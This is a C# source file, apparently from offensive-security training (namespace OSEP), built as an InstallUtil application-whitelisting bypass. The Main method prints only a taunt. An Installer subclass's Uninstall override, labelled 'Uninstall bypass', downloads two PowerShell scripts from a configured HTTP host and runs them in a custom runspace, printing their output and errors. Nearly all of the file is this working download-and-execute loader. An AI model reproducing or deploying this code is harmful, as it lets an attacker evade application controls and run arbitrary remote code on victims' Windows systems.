using System;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace OSEP
{
    class Entry
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Try harder???");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Debug.RunDebug("\nUninstall bypass started.");

            //testing
            byte[] prescript = DownloadFileAsync($"{CONFIG.HTTP_URL}/pv.txt").GetAwaiter().GetResult();

            byte[] script = DownloadFileAsync($"{CONFIG.HTTP_URL}/{CONFIG.PS_DYNAMIC_SCRIPT_NAME}").GetAwaiter().GetResult();

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;


            ps.AddScript(Encoding.UTF8.GetString(prescript));
            ps.AddScript(Encoding.UTF8.GetString(script));

            //ps.Invoke();

            //testing start
            Collection<PSObject> results = ps.Invoke();
            foreach (PSObject result in results)
            {
                Debug.RunDebug(result?.BaseObject?.ToString());
                Console.WriteLine(result?.ToString());
            }

            foreach (ErrorRecord error in ps.Streams.Error)
            {
                Debug.RunDebug(error.ToString());
                Console.WriteLine(error?.ToString());
            }
            //testign end

            rs.Close();
        }

        public static async Task<byte[]> DownloadFileAsync(string url)
        {
            using (var client = new HttpClient())
            {
                return await client.GetByteArrayAsync(url);
            }
        }
    }
}